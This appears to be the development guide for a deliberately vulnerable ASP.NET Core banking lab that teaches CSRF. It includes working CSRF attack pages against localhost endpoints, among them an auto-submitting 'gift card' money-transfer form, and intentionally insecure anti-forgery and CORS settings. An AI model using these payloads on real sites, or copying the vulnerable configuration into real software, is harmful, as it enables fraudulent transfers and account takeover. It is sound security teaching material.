# Development Guide - Lab 04: .NET Core Banking Application

## Prerequisites

- .NET 8.0 SDK
- Visual Studio 2022 or VS Code with C# extension
- SQL Server LocalDB (included with Visual Studio)
- Docker Desktop (optional)
- Basic understanding of ASP.NET Core MVC and Entity Framework

## Project Structure

```
labs/lab-04-dotnet-banking/
├── README.md
├── ARCHITECTURE.md
├── DEV_GUIDE.md
├── DEPLOY_LOCAL.md
├── SECURITY_REVIEW.md
├── SecureBankingApp.sln
├── Dockerfile
├── docker-compose.yml
├── src/
│   └── SecureBankingApp/
│       ├── SecureBankingApp.csproj
│       ├── Program.cs
│       ├── appsettings.json
│       ├── appsettings.Development.json
│       ├── Controllers/
│       │   ├── HomeController.cs
│       │   ├── AccountController.cs
│       │   ├── TransferController.cs
│       │   └── AdminController.cs
│       ├── Models/
│       │   ├── ApplicationUser.cs
│       │   ├── BankAccount.cs
│       │   ├── Transaction.cs
│       │   └── ViewModels/
│       ├── Views/
│       │   ├── Shared/
│       │   ├── Home/
│       │   ├── Account/
│       │   ├── Transfer/
│       │   └── Admin/
│       ├── Data/
│       │   └── ApplicationDbContext.cs
│       └── wwwroot/
├── tests/
│   └── CSRFTests/
└── interview/
    └── QUESTIONS.md
```

## Setup Instructions

### 1. Create New Project

```bash
cd labs/lab-04-dotnet-banking
dotnet new sln -n SecureBankingApp
dotnet new mvc -n SecureBankingApp -o src/SecureBankingApp
dotnet sln add src/SecureBankingApp/SecureBankingApp.csproj
```

### 2. Install Required Packages

```bash
cd src/SecureBankingApp
dotnet add package Microsoft.AspNetCore.Identity.EntityFrameworkCore
dotnet add package Microsoft.EntityFrameworkCore.SqlServer
dotnet add package Microsoft.EntityFrameworkCore.Tools
dotnet add package Microsoft.VisualStudio.Web.CodeGeneration.Design
```

### 3. Database Setup

```bash
# Add initial migration
dotnet ef migrations add InitialCreate

# Update database
dotnet ef database update
```

### 4. Seed Data

The application will automatically seed test users and accounts on first run:

- **Admin User**: admin@securebank.com / Admin123!
- **Regular User**: user@securebank.com / User123!
- **Test User**: test@securebank.com / Test123!

## Development Workflow

### Running the Application

```bash
# Run in development mode
dotnet run

# Run with hot reload
dotnet watch run

# Run in production mode
dotnet run --environment=Production
```

The application will be available at:
- HTTP: http://localhost:5000
- HTTPS: https://localhost:5001

### Database Operations

```bash
# Add new migration
dotnet ef migrations add [MigrationName]

# Update database
dotnet ef database update

# Remove last migration
dotnet ef migrations remove

# Reset database
dotnet ef database drop --force
dotnet ef database update
```

## CSRF Vulnerability Testing

### 1. Money Transfer CSRF

Create a malicious HTML file to test CSRF:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Congratulations! You've won a gift card!</h1>
    <p>Click below to claim your reward:</p>
    
    <!-- CSRF Attack Form -->
    <form action="http://localhost:5000/Transfer/Send" method="post" id="csrfForm">
        <input type="hidden" name="ToAccountNumber" value="ATTACKER123" />
        <input type="hidden" name="Amount" value="1000" />
        <input type="hidden" name="Description" value="Gift card claim" />
        <input type="submit" value="Claim Your $100 Gift Card!" 
               style="background-color: #4CAF50; color: white; padding: 15px 32px; font-size: 16px;" />
    </form>
    
    <!-- Auto-submit after 3 seconds -->
    <script>
        setTimeout(function() {
            document.getElementById('csrfForm').submit();
        }, 3000);
    </script>
</body>
</html>
```

### 2. Profile Update CSRF

Test profile modification via CSRF:

```html
<form action="http://localhost:5000/Account/UpdateProfile" method="post">
    <input type="hidden" name="Email" value="attacker@evil.com" />
    <input type="hidden" name="PhoneNumber" value="555-EVIL" />
    <input type="hidden" name="DailyTransferLimit" value="50000" />
    <input type="submit" value="Update Profile" />
</form>
```

### 3. Admin Function CSRF

Test administrative actions:

```html
<!-- Freeze account CSRF -->
<img src="http://localhost:5000/Admin/FreezeAccount?accountId=123" />

<!-- Create account CSRF -->
<form action="http://localhost:5000/Admin/CreateAccount" method="post">
    <input type="hidden" name="AccountNumber" value="EVIL123" />
    <input type="hidden" name="UserId" value="attacker-user-id" />
    <input type="hidden" name="InitialBalance" value="1000000" />
    <input type="submit" value="Create Account" />
</form>
```

## Security Analysis

### Vulnerable Endpoints

1. **TransferController.Send()** - No CSRF protection
2. **AccountController.UpdateProfile()** - Missing anti-forgery validation
3. **AdminController.FreezeAccount()** - Administrative action without CSRF protection
4. **AdminController.CreateAccount()** - Account creation vulnerable to CSRF

### Code Review Focus Areas

1. **Missing Attributes**: Look for `[ValidateAntiForgeryToken]`
2. **Form Tokens**: Check for `@Html.AntiForgeryToken()` in views
3. **Cookie Configuration**: Review SameSite settings
4. **CORS Settings**: Examine cross-origin policies

### Intentional Vulnerabilities

The application includes these intentional security issues:

```csharp
// VULNERABLE: Missing CSRF protection
[HttpPost]
public async Task<IActionResult> Send(TransferViewModel model)
{
    // Should have [ValidateAntiForgeryToken] attribute
    // Processes transfer without CSRF validation
}
```

```html
<!-- VULNERABLE: Missing anti-forgery token in forms -->
<form method="post" action="/Transfer/Send">
    <!-- Should include @Html.AntiForgeryToken() -->
    <input name="ToAccountNumber" />
    <input name="Amount" />
    <button type="submit">Send Money</button>
</form>
```

## Configuration Settings

### Anti-Forgery Configuration (Disabled for Testing)

```csharp
// In Program.cs - VULNERABLE CONFIGURATION
services.Configure<AntiforgeryOptions>(options =>
{
    options.SuppressXFrameOptionsHeader = true; // Allows framing
    options.Cookie.SameSite = SameSiteMode.None; // Allows cross-site requests
    options.Cookie.SecurePolicy = CookieSecurePolicy.None; // Allows HTTP
});
```

### CORS Configuration (Overly Permissive)

```csharp
// VULNERABLE: Allows all origins
app.UseCors(builder => builder
    .AllowAnyOrigin()
    .AllowAnyMethod()
    .AllowAnyHeader());
```

## Testing Tools

### Manual Testing

1. **Browser Developer Tools**: Network tab to inspect requests
2. **Postman**: API testing and request manipulation
3. **Burp Suite**: Web application security testing

### Automated Testing

```bash
# Run unit tests
dotnet test

# Run integration tests
dotnet test --filter Category=Integration

# Run CSRF-specific tests
dotnet test --filter Category=CSRF
```

### Security Scanning

```bash
# OWASP Dependency Check
dotnet list package --vulnerable

# CodeQL analysis (if available)
dotnet build --configuration Release --verbosity normal
```

## Common Issues and Solutions

### Database Connection Issues

```bash
# Reset LocalDB
sqllocaldb stop MSSQLLocalDB
sqllocaldb delete MSSQLLocalDB
sqllocaldb create MSSQLLocalDB
sqllocaldb start MSSQLLocalDB
```

### Migration Issues

```bash
# Clear migrations and restart
rm -rf Migrations/
dotnet ef migrations add InitialCreate
dotnet ef database update
```

### Authentication Issues

```bash
# Clear authentication cookies
# In browser: Clear cookies for localhost
# Or use incognito/private browsing mode
```

## Deployment Notes

### Development Environment

- HTTPS redirection disabled for testing
- Detailed error pages enabled
- Anti-forgery validation disabled on vulnerable endpoints
- Development CORS policy allows all origins

### Production Considerations (Not Implemented)

For a secure production deployment:

1. Enable HTTPS redirection
2. Configure proper CORS policies
3. Enable anti-forgery token validation
4. Set secure cookie policies
5. Implement proper error handling
6. Add security headers
7. Enable request rate limiting

## Learning Objectives

After completing this lab, students should understand:

1. How CSRF attacks work in web applications
2. The importance of anti-forgery token validation
3. Cookie security attributes (SameSite, Secure, HttpOnly)
4. Proper form validation in ASP.NET Core
5. Administrative function protection
6. Cross-origin request policies
7. Security testing methodologies
